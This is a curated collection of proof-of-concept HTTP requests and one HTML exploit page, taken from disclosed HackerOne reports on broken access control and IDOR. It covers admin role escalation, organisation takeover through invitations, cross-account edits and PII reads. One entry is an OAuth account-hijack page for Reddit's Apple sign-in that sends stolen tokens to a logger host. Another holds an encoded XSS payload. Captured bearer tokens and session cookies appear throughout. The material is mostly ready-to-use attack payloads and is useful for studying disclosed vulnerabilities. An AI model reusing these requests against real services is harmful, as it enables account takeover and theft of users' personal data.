# Broken Access Control & IDOR  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 488
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
# … truncated …
```

## 2. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
Host: console.helium.com
Content-Length: 31
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"membership":{"role":"admin"}}
```

## 3. [#809816](https://hackerone.com/reports/809816)  -  Organization Takeover
*high, $500*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 488
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba310…

{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
# … truncated …
```

## 4. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /graphql HTTP/1.1
Host: console.helium.com
Content-Length: 469
authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
content-type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/dashboard
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"operationName":"PaginatedOrganizationsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedOrganizationsQuery($page: Int, $pageSize: Int) {\n  organizations(page: $page, pageSize: $pageSize) {\n    entries {\n      ...OrganizationFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment OrganizationFragment on Organization {\n  id\n  name\n  inserted_at\n  __typename\n}\n"}
# … truncated …
```

## 5. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /api/invitations HTTP/1.1
Host: console.helium.com
Content-Length: 125
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
Content-Type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"883b0a46-e4cf-4315-af4f-4226d1ada561"}}
```

## 6. [#835005](https://hackerone.com/reports/835005)  -  Organization Takeover via invitation API
*medium, $100*

```http
POST /api/invitations HTTP/1.1
Host: console.helium.com
Content-Length: 126
Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTg1NzAyODgzLCJpYXQiOjE1ODU2MTY0ODMsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIwNjUwMGRiOS1kNjNlLTRiYTQtYWJiYy0xYmQ0YTViMzUxY2YiLCJuYmYiOjE1ODU2MTY0ODIsIm9yZ2FuaXphdGlvbiI6Ijg4M2IwYTQ2LWU0Y2YtNDMxNS1hZjRmLTQyMjZkMWFkYTU2MSIsIm9yZ2FuaXphdGlvbl9uYW1lIjoibG9sIiwic3ViIjoiOGY1YWJlMTktMDAwMS00MWI1LWE5NjktZmUwYjcxZGNjZjFmIiwidHlwIjoiYWNjZXNzIiwidXNlciI6IjhmNWFiZTE5LTAwMDEtNDFiNS1hOTY5LWZlMGI3MWRjY2YxZiJ9.VMAi-07cZkCJg-dffHdR1wwJbi9JNSzpaQSRSQGDX-_vDrcTOPEfgJU_LCZ8H5tYiwsexyD-ogLFakGY1bFy-A
Content-Type: application/json
Origin: https://console.helium.com
Referer: https://console.helium.com/users
Cookie: _ga=GA1.2.356414044.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22;…

{"invitation":{"email":"azraelsec+1@wearehackerone.com","role":"admin","organization":"cb23000e-65b3-4628-9ede-656ffa0d5aa8"}}
```

## 7. [#1124974](https://hackerone.com/reports/1124974)  -  Attacker Can Access to any Ticket Support on https://www.devicelock.com/support/
*medium*

```http
POST /support/ticket_edit.html?ID=0 HTTP/1.1
Host: www.devicelock.com
Content-Length: 1505
Origin: https://www.devicelock.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEbeDU0DJhrnLl8U7
Referer: https://www.devicelock.com/support/ticket_edit.html?ID=38173
Cookie: <attacker_Cookie>

------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="sessid"

<sessid_attacker>
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="set_default"

Y
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="ID"

<victim_id>
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="lang"

en
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
Content-Disposition: form-data; name="TITLE"

anything
------WebKitFormBoundaryEbeDU0DJhrnLl8U7
# … truncated …
```

## 8. [#1521336](https://hackerone.com/reports/1521336)  -  Staff can create workflows in Shopify Admin without apps permission
*medium*

```http
POST /admin/internal/web/graphql/flow HTTP/2
Host: davidola2.myshopify.com
Cookie: _secure_admin_session_id=93f2f; _secure_admin_session_id_csrf=93f2
Content-Type: application/json
X-Csrf-Token: VD...
Origin: https://davidola2.myshopify.com
Content-Length: 44

{"operationName":"AppAccessTimeUpdate","variables":{"appId":"gid://shopify/App/1602671"},"query":"mutation AppAccessTimeUpdate($appId: ID!) {\n  appAccessTimeUpdate(id: $appId) {\n    app {\n      id\n      __typename\n    }\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 9. [#947728](https://hackerone.com/reports/947728)  -  staff can able to extend shopify trial period without admin permission
*low*

```http
POST /admin/internal/web/graphql/core HTTP/1.1
Host: risinghunter.myshopify.com
Content-Length: 218
X-CSRF-Token: H9hN7Wt7-0Q1PwBhOsOIZMpEcCnp0WZQw8BM
content-type: application/json
Origin: https://risinghunter.myshopify.com
Cookie: new_admin=1; new_theme_editor_disabled.sig=c0lGzzh0MFBQ5fCQTfz7yqvtriw; new_theme_editor_dis…

{"operationName":"TrialSelfExtend","variables":{},"query":"mutation TrialSelfExtend {\n  trialSelfExtend {\n    message\n    userErrors {\n      field\n      message\n      __typename\n    }\n    __typename\n  }\n}\n"}
```

## 10. [#1952771](https://hackerone.com/reports/1952771)  -  ████ ' can change any account email and cannot retrieve his account and access it ' at ███
*high*

```http
POST /_post/usuario_actualizar.php HTTP/1.1
Host: ████████
Cookie: ████
Referer: ████████
Content-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594
Content-Length: 2851
Origin: ███████-Insecure-Requests: 1

-----------------------------297392175112058█████████████7932062474594
Content-Disposition: form-data; name="nombre"

attacker
-----------------------------297392175112058████7932062474594
Content-Disposition: form-data; name="apellido"

attacker
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="email"

████████████
-----------------------------297392175112058███████7932062474594
Content-Disposition: form-data; name="rut"


-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idProvincia"

0
-----------------------------297392175112058███7932062474594
Content-Disposition: form-data; name="idLocalidad"
# … truncated …
```

## 11. [#1773609](https://hackerone.com/reports/1773609)  -  IDOR at mtnmobad.mtnbusiness.com.ng leads to PII leakage.
*critical*

```http
POST /app/getUserNotes HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Content-Type: application/json
Content-Length: 195
Origin: https://mtnmobad.mtnbusiness.com.ng
Referer: https://mtnmobad.mtnbusiness.com.ng/
Cookie: G_ENABLED_IDPS=google; connect.sid=s%3ATYGgZ8wqgEinB9zX0d7-OdZyt2jXa_ev.hQw0FOvTD5bB159jCtqA…

{"params":{"updates":[{"param":"user","value":{"userEmail":"<PUT_VICTIM_EMAIL_HERE>"},"op":"a"}],"cloneFrom":{"updates":null,"cloneFrom":null,"encoder":{},"map":null},"encoder":{},"map":null}}
```

## 12. [#1773609](https://hackerone.com/reports/1773609)  -  IDOR at mtnmobad.mtnbusiness.com.ng leads to PII leakage.
*critical*

```http
POST /app/getUserNotes HTTP/1.1
Host: mtnmobad.mtnbusiness.com.ng
Content-Type: application/json
Content-Length: 195
Origin: https://mtnmobad.mtnbusiness.com.ng
Referer: https://mtnmobad.mtnbusiness.com.ng/
Cookie: G_ENABLED_IDPS=google; connect.sid=s%3ATYGgZ8wqgEinB9zX0d7-OdZyt2jXa_ev.hQw0FOvTD5bB159jCtqA…
```

## 13. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 4
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/swag-shop

id=3
```

## 14. [#404797](https://hackerone.com/reports/404797)  -  IDOR to delete images from other stores
*low, $600*

```http
GET /php/client_manage_handler?███&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
X-Requested-With: XMLHttpRequest
Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f325…
X-Forwarded-For: 127.0.0.1
```

## 15. [#404797](https://hackerone.com/reports/404797)  -  IDOR to delete images from other stores
*low, $600*

```http
GET /php/client_manage_handler?███&case=remove-active-photo HTTP/1.1
Host: www.zomato.com
Referer: https://www.zomato.com/
X-Requested-With: XMLHttpRequest
Cookie: _ga=GA1.2.2082511252.1535917423; _gid=GA1.2.1587734047.1535917423; PHPSESSID=4821c7caf69f325…
X-Forwarded-For: 127.0.0.1

'''
```

## 16. [#1124974](https://hackerone.com/reports/1124974)  -  Attacker Can Access to any Ticket Support on https://www.devicelock.com/support/
*medium*

```http
POST /support/ticket_edit.html?ID=0 HTTP/1.1
Host: www.devicelock.com
Content-Length: 1505
Origin: https://www.devicelock.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryEbeDU0DJhrnLl8U7
```

## 17. [#345162](https://hackerone.com/reports/345162)  -  Local File Download
*critical*

```http
GET /chat/send-attach/583-5PH467W8RA2NCWJ?__sid=583-5PH467W8RA2NCWJ&send_blob_id=485&_=1525115609706 HTTP/1.1
Host: support.ratelimited.me
Referer: https://support.ratelimited.me/widget/chat.html?dpsid=583-5PH467W8RA2NCWJ&parent_url=https%3A%2F%2Fsupport.ratelimited.me%2Fprofile
X-Requested-With: XMLHttpRequest
Cookie: __cfduid=debed713d869308c24159d6b0ce4df2481525076018; dpsid=583-5PH467W8RA2NCWJ; dpvc=11941-…
```

## 18. [#1410498](https://hackerone.com/reports/1410498)  -  IDOR: leak buyer info & Publish/Hide foreign comments
*high, $1,250*

```http
POST /extensions/checkout_comments/curate_comment HTTP/1.1
Host: judge.me
Cookie: _judgeme_session=████████████████; _ga=GA1.2.1935027813.1637882690; _gid=GA1.2.2043288340.16…
Referer: https://judge.me/extensions/checkout_comments/comments?platform=shopify&shop_domain=test-hackerone-glis.myshopify.com&page=3&offset=50
X-Csrf-Token: ████==
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 23
Origin: https://judge.me
```

## 19. [#1521336](https://hackerone.com/reports/1521336)  -  Staff can create workflows in Shopify Admin without apps permission
*medium*

```http
POST /admin/internal/web/graphql/flow HTTP/2
Host: davidola2.myshopify.com
Cookie: _secure_admin_session_id=93f2f; _secure_admin_session_id_csrf=93f2
Content-Type: application/json
X-Csrf-Token: VD...
Origin: https://davidola2.myshopify.com
Content-Length: 44
```

## 20. [#854290](https://hackerone.com/reports/854290)  -  IDOR on update user preferences
*critical*

```http
PUT /api/v1/user/preferences/{user1-uuid} HTTP/2.0
Host: api.outpost.co
Content-Length: 434
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://app.outpost.co
Referer: https://app.outpost.co/
```

## 21. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 122
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Referer: https://hackyholidays.h1ctf.com/signup-manager/

action=signup&username=kunalbrokunal12&password=kunalbrokunal12&age=1e6&firstname=kunalbrokunal12&lastname=YYYYYYYYYYYYYYY
```

## 22. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /swag-shop/api/purchase HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 4
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: https://hackyholidays.h1ctf.com
Referer: https://hackyholidays.h1ctf.com/swag-shop
```

## 23. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 172
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 24. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 134
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 25. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 106
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 26. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 24
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 27. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /evil-quiz/start HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 26
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 28. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```http
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Content-Length: 122
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
```

## 29. [#1392032](https://hackerone.com/reports/1392032)  -  Orders full read for a staff with only `Customers` permissions.
*low, $800*

```http
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=████; _secure_admin_session_id_csrf=██████; _master_udr=eyJfcmFpbHM…
Content-Type: application/json
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 156

{
"query":"query MyQuery { node(id: \"gid://shopify/Customer/5639003504696\") { ... on HasEvents { events(first: 10) { edges { node { message } } } } } }"
}
```

## 30. [#1392032](https://hackerone.com/reports/1392032)  -  Orders full read for a staff with only `Customers` permissions.
*low, $800*

```http
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=███; _secure_admin_session_id_csrf=███; _master_udr=eyJfcmFpbHMiOns…
Content-Type: application/json
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 153

{
"query":"query MyQuery { node(id: \"gid://shopify/Order/4287851397176\") { ... on Order { id, totalPrice } } }"
}
```

## 31. [#1392032](https://hackerone.com/reports/1392032)  -  Orders full read for a staff with only `Customers` permissions.
*low, $800*

```http
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=████; _secure_admin_session_id_csrf=██████; _master_udr=eyJfcmFpbHM…
Content-Type: application/json
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 156
```

## 32. [#1392032](https://hackerone.com/reports/1392032)  -  Orders full read for a staff with only `Customers` permissions.
*low, $800*

```http
POST /admin/internal/web/graphql/core HTTP/2
Host: scara31-store4.myshopify.com
Cookie: _secure_admin_session_id=███; _secure_admin_session_id_csrf=███; _master_udr=eyJfcmFpbHMiOns…
Content-Type: application/json
X-Csrf-Token: Xs1twjjo-U9Q9RgMvDrLMuEPTa-Xeyj3TKCw
Origin: https://scara31-store4.myshopify.com
Content-Length: 153
```

## 33. [#2107934](https://hackerone.com/reports/2107934)  -  Admins can change authentication details of user configured external storage
*low, $100*

```http
POST /nextcloud/index.php/apps/files_external/globalcredentials HTTP/1.1
Host: 192.168.56.103
Content-Length: 43
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: http://192.168.56.103
Cookie: oc_sessionPassphrase=B4MUb9O8t71%2BDkT%2FXpeTcrJgb5FoSTRXXKwlRJTJKQ027je%2F7KT2XbFCPs6hU4Wgj…
```

## 34. [#2516250](https://hackerone.com/reports/2516250)  -  Access Control Vulnerability Enabling Unauthorized Access to Limited Disclosure Reports
*high*

```http
POST /reports/bulk HTTP/2
Host: hackerone.com
Cookie: <USER B Cookies>
Referer: https://hackerone.com/reports/2424755
X-Csrf-Token: <USER B CSRF TOKEN>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 289
Origin: https://hackerone.com

message=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<your report ID>&bounty_currency=USD
```

## 35. [#1952771](https://hackerone.com/reports/1952771)  -  ████ ' can change any account email and cannot retrieve his account and access it ' at ███
*high*

```http
POST /_post/usuario_actualizar.php HTTP/1.1
Host: ████████
Cookie: ████
Referer: ████████
Content-Type: multipart/form-data; boundary=---------------------------297392175112058██████████7932062474594
Content-Length: 2851
Origin: ███████-Insecure-Requests: 1
```

## 36. [#1567186](https://hackerone.com/reports/1567186)  -  One-click account hijack for anyone using Apple sign-in with Reddit, due to response-type switch + leaking href to XSS on www.redditmedia.com
*critical*

```html
<html>
<style>pre { word-break: break-word; white-space: pre-wrap; }</style>
<body>
<div id="start">
Attacker, enter your Apple ID-OAuth URL when trying to <a href="https://reddit.com" target="_blank">sign in to Reddit here</a>:<br />
<input id="state">
<button onclick="launch(extractstate(document.getElementById('state').value), true)">Generate a victim URL with attacker's state</button>
</div>


<div id="fr"></div>

<script>
var inj, monitor;
function extractstate(st) {
    return st.indexOf('&state=') !== -1 ? st.split('&state=')[1].split('&')[0] : st;
}
function startmonitor(st) {
    history.pushState('/','/',location.pathname + '?monitor&state=' + st)
    monitor = setInterval(function() {
        fetch('https://MY-LOGGER-DOMAIN/reddit/parse.php?q=' + st).then(e => e.text()).then(e => {
            if (e.length) {
                document.getElementById('fr').innerText = 'Attacker, log in to Reddit by running this in the console from Apple-ID popup: ';
                var p = document.createElement('pre');
                p.innerText = 'opener.postMessage(\'' + unescape(e.trim()) + '\',"*");';
                document.getElementById('fr').appendChild(p)
                clearInterval(monitor);
            }
        });
    }, 2000);
}
function launch(st, showonly) {
    if (showonly) {
        history.pushState('/','/',location.pathname + '?state=' + st)
        document.getElementById('fr').innerText = 'Send this link to victim: ';
# … truncated …
```

## 37. [#2040756](https://hackerone.com/reports/2040756)  -  An attacker can submit a Pentest Opportunity and change the status of the opportunity from submitted to in_review or reviewed
*medium*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Cookie: <COOKIES>
Referer: https://hackerone.com/bugs?subject=user&report_id=2036649&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=pre-submission&substates%5B%5D=retesting&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1
Content-Type: application/json
X-Csrf-Token: <CSRF-TOKEN>
Content-Length: 452
Origin: https://hackerone.com

{"query": "mutation {\r\n  createPentestOpportunity(\r\n    input: {\r\n      company_name: \"My Company\"\r\n      customer_email: \"marvelmaniac@wearehackerone.com\"\r\n      organization_id: <ORG-ID>\r\n      name: \"My Pentest\"\r\n    }\r\n  ) {\r\n    clientMutationId\r\n    pentest_opportunity {\r\n      id\r\n      token\r\n    }\r\n    errors {\r\n      edges{node{message}}\r\n      total_count\r\n    }\r\n    was_successful\r\n  }\r\n}\r\n"}
```

## 38. [#1581528](https://hackerone.com/reports/1581528)  -  Can access the job name, creator name and can report any draft/under review/rejected job
*medium*

```http
POST /lite/flag-content?contentUrn=urn:li:jobPosting:3086455454&reason=OFFENSIVE&contentSource=JOBS_PREMIUM_OFFLINE&authorProfileId=0&trk=report-content HTTP/2
Host: www.linkedin.com
Cookie: XXX
Origin: https://www.linkedin.com
Referer: https://www.linkedin.com/jobs/view/3084381086/?refId=%EF%BF%BD%2F%EF%BF%BD%21d%EF%BF%BD%27%EF%BF%BDe%1A_s%EF%BF%BD%16%EF%BF%BD%EF%BF%BD&trk=d_flagship3_company
Content-Length: 0
```

## 39. [#1851818](https://hackerone.com/reports/1851818)  -  Member role which doesn't have permission to send message can send by executing channel commands
*medium*

```http
POST /api/v4/commands/execute HTTP/1.1
Host: test3.cloud.mattermost.com
X-Requested-With: XMLHttpRequest
X-CSRF-Token:5 [ jkue786iyfd6dkpiq7ftisys6y
Content-Type: application/json
Content-Length: 104
Origin: https://test3.cloud.mattermost.com

{"command":"/echo ami","channel_id":"khhnkrf5wf8yibwx8bd14s6fbw","team_id":"8jdphis493d4pbq3u1bagz643r"}
```

## 40. [#1851818](https://hackerone.com/reports/1851818)  -  Member role which doesn't have permission to send message can send by executing channel commands
*medium*

```http
POST /api/v4/commands/execute HTTP/1.1
Host: test3.cloud.mattermost.com
X-Requested-With: XMLHttpRequest
X-CSRF-Token:5 [ jkue786iyfd6dkpiq7ftisys6y
Content-Type: application/json
Content-Length: 104
Origin: https://test3.cloud.mattermost.com
```

## 41. [#914331](https://hackerone.com/reports/914331)  -  IDOR on notes to HTML injection
*medium*

```http
PUT /api/v1/note/b9db186a-c0af-462d-ad71-c30c2bfd7cf5 HTTP/1.1
Host: api.outpost.co
Content-Length: 102
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Origin: https://app.outpost.co
Referer: https://app.outpost.co/
Cookie:  <authentacation_cookies>

{"body":"<h1><a href=\"j&#97v&#97script&#x3A;&#97lert(1)\">This is a test</a></h1>","mentionUuids":[]}
```

## 42. [#914331](https://hackerone.com/reports/914331)  -  IDOR on notes to HTML injection
*medium*

```http
